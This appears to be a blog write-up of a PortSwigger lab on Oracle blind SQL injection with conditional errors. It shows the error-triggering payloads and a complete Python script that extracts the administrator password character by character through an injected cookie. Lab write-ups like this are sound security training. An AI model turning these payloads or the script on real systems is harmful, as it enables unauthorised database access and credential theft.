+++
date = '2026-07-16T10:02:16+08:00'
draft = false
title = "Blind SQL injection with conditional errors | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = 'Also quite painful lab, careful with Oracle syntax'
showLastUpdated = true
+++

This lab is quite similar to [last lab](/training/portswigger/sqli/sqli_practitioner7), with an SQLi present in the tracking cookie. But this time there is no `Welcome back!` message or the like, so we cannot rely on the server to hand out freebies for us (rip). Notice that the server still processes nonsense injected SQL query inside `trackingId`, evident by this 500:
![](/images/viber_image_2026-07-16_09-15-02-750.png)

This gives us an idea, if the server does not reflect invalid query in the response, perhaps we can *make it does*? We can instead modify the query so that it causes a **database error** only if some conditions are satisfied, for example:
```sql
AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'
AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'
```
`1/0` causes a divide-by-zero error, which will probably leads to a 500. Let's test this with those two payloads above. Note that since this is an Oracle database, the syntax will be quite different:
![](/images/viber_image_2026-07-16_09-18-31-087.png)
![](/images/viber_image_2026-07-16_09-18-32-468.png)

This works as expected! `1=1` will resolve to executing `1/0` which returns a 500, and 200 otherwise. We pretty much got an eye surgery after this and is no longer testing SQLi blind. As with [last lab](/training/portswigger/sqli/sqli_practitioner7), we first need to determine the length of the password which is coincidentally also 20:
![](/images/viber_image_2026-07-16_09-50-41-599.png)

We can reuse the same code as with last lab, same binary search algorithm with little tweaks in the conditions:
```python
import requests

url= "https://<lab-id>.web-security-academy.net/filter?category=Gifts"
cookie_string = "TrackingId=<id>' AND (SELECT CASE WHEN SUBSTR(password, 1, {current_length}) > '{current_password}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'--; session=<cookie>"
password = ""
password_length = 20

wordlist = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
            'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
            'w', 'x', 'y', 'z']

for current_length in range(1, password_length + 1):
    response = ""
    l, r = 0, len(wordlist) - 1
    
    # Binary search each character
    while l < r:
        mid = (l + r) // 2
        
        headers = {
            "Cookie": cookie_string.format(current_length=current_length, current_password=password + wordlist[mid])
        }
        
        response = requests.get(url, headers=headers)
        
        # Current character has ASCII value lower than or equal to wordlist[mid]
        if response.ok:
            r = mid
        # Current character has ASCII value higher than wordlist[mid]
        else:
            l = mid + 1
            
    password += wordlist[l]
    print(password)
```

Note that for Oracle database, it's `SUBSTR` not `SUBSTRING` (took a good 10 minutes to realise this).